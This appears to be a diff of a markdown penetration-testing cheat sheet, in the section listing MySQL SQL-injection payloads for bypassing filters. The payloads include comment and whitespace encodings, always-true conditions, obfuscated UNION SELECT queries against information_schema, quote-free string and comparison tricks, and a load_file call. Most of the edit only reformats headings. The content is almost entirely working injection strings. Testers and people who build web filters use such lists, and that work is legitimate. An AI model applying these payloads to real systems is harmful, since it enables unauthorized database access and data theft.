@@ -430,32 +430,31 @@ admin' and substring(password/text(),1,1)='7
 ```
 ### SQL injection bypass filter
 ```sql
- # Comments
-' or 1=1#
-' or 1=1/* (MySQL < 5.1)
-' or 1=1;%00
-' or 1=1 union select 1,2 as `
-' or#newline
-' /*!50000or*/1='1
-' /*!or*/1='1'
- # Prefix
+### Comments
+//,
+-- ,
+/**/, 
+#,
+--+,
+--  -,
+;--a 
+### Prefix
 + – ~ !
 ' or –+2=- -!!!'2
- # Operator:
+ ### Operator:
 ^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
- # Spaces
+### Spaces
 %20 %09 %0a %0b %0c %0d %a0 /**/
 'or+(1)sounds/**/like"1"–%a0-
 'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
- # A quoted string
+### A quoted string
 SELECT 'a'
 SELECT "a"
 SELECT n'a'
 SELECT b'1100001′
 SELECT _binary'1100001′
 SELECT x'61'
- 
- # Unquoted string
+### Unquoted string
 'abc' = 0×616263
 and substr(data,1,1) = 'a'#
 and substr(data,1,1) = 0x61 # 0x6162
@@ -466,20 +465,20 @@ and hex(substr(data,1,1)) = 61#
 and ascii(substr(data,1,1)) = 97#
 and ord(substr(data,1,1)) = 97# 
 and substr(data,1,1) = lower(conv(10,10,36))# 'a'
- # Alias
+### Alias
 select pass as alias from users
 select pass`alias alias`from users
 ```
 ```sql
-# Font
+### Font
 ' or true = '1 # or 1
 '' or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
 ' or '1 # or true
- # Operator fonts
+### Operator fonts
 select * from users where 'a'='b'='c'
 select * from users where ('a'='b')='c'
 select * from users where (false)='c'
- # Seriously bypass the '='
+### Seriously bypass the '='
 select * from users where name = "="
 select * from users where false = ""
 select * from users where 0 = 0
@@ -492,7 +491,7 @@ load_file/*foo*/(0×616263)
  ascii('a') = 97
  ord('a') = 97
 'ABC' = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
- # Extracted substring substr ( 'abc', 1,1) = 'a'
+### Extracted substring substr ( 'abc', 1,1) = 'a'
 substr('abc' from 1 for 1) = 'a'
 substring('abc',1,1) = 'a'
 substring('abc' from 1 for 1) = 'a'
@@ -504,7 +503,7 @@ left('abc',1) = 'a'
 reverse(right(reverse('abc'),1)) = 'a'
 insert(insert('abc',1,0,space(0)),2,222,space(0)) = 'a'
 space(0) = trim(version()from(version()))
- # Substring search
+### Substring search
 locate('a','abc')
 position('a','abc')
 position('a' IN 'abc')
@@ -515,28 +514,28 @@ length(trim(leading 'a' FROM 'abc'))
 length(replace('abc', 'a', "))
 ```
 ```sql
- # String comparison
+### String comparison
 strcmp('a','a')
 mod('a','a')
 find_in_set('a','a')
 field('a','a')
 count(concat('a','a'))
  
- # String length
+### String length
 length()
 bit_length()
 char_length()
 octet_length()
 bit_count()
  
- # Keyword filter
+### Keyword filter
 Connected keyword filtering
 (0)union(select(table_name),column_name,…
 0/**/union/*!50000select*/table_name`foo`/**/…
 0%a0union%a0select%09group_concat(table_name)….
 0′union all select all`table_name`foo from`information_schema`. `tables`
  
- # Flow control
+### Flow control
 case 'a' when 'a' then 1 [else 0] end
 case when 'a'='a' then 1 [else 0] end
 if('a'='a',1,0)
